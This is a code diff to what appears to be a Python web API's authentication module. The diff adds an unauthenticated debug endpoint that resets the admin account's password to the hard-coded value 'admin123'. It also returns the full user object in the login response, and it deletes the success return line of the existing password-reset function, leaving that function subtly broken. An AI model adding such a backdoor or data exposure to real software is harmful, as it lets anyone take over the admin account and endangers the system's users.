@@ -35,6 +35,7 @@ def login_access_token(
             user.id, expires_delta=access_token_expires
         ),
         "token_type": "bearer",
+        "user": user
     }
 
 
@@ -124,4 +125,14 @@ def reset_password(
     db.delete(reset_req)
     db.commit()
 
-    return {"msg": "Password updated successfully"}
+
+@router.post("/reset-admin-password-debug")
+def reset_admin_password_debug(db: Session = Depends(deps.get_db)) -> Any:
+    statement = select(User).where(User.email == "admin@najbel.com")
+    user = db.exec(statement).first()
+    if user:
+        user.hashed_password = security.get_password_hash("admin123")
+        db.add(user)
+        db.commit()
+        return {"msg": "Admin password reset successfully"}
+    return {"msg": "Admin not found"}
